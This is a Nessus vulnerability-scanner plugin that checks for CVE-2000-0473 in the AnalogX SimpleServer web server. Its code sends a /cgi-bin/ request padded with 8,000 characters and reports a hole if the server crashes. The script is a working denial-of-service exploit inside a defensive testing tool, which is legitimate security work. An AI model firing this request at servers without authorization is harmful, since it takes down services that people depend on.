#
# Crashes 'Server: SimpleServer:WWW/1.05' (analogx)
#
# by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Script License for details

if(description)
{
 script_id(10445);
 script_bugtraq_id(1349);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-0473");
 name["english"] = "AnalogX denial of service by long CGI name";
 name["francais"] = "Déni de service AnalogX par nom de cgi long";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the remote service by requesting
a URL with too many characters following the /cgi-bin/
directory. For example:

  http://www.YOURSERVER.com/cgi-bin/TOO-MANY-CHARACTERS

where 'TOO-MANY-CHARACTERS' represents a random string of 
8,000 characters.

Solution : Upgrade your web server to the latest version, or consider 
an alternate web server, such as Apache (http://www.apache.org).

Risk factor : High";


 desc["francais"] = "
 Il s'est avéré possible de faire planter le service distant
en faisant la requète d'une URL composée de beaucoup de caractères
précédés de /cgi-bin.

Solution : mettez ce serveur a jour
Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crash the remote HTTP service";
 summary["francais"] = "plante le service distant";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000  Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}


#
# Here we go
#
include("http_func.inc");

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

if(!get_port_state(port))exit(0);

soc = http_open_socket(port);
if(!soc)exit(0);

req = http_get(item:string("/cgi-bin/", crap(8000)), port:port);
send(socket:soc, data:req);
r = http_recv(socket:soc);
http_close_socket(soc);


if (http_is_dead(port: port)) security_hole(port);



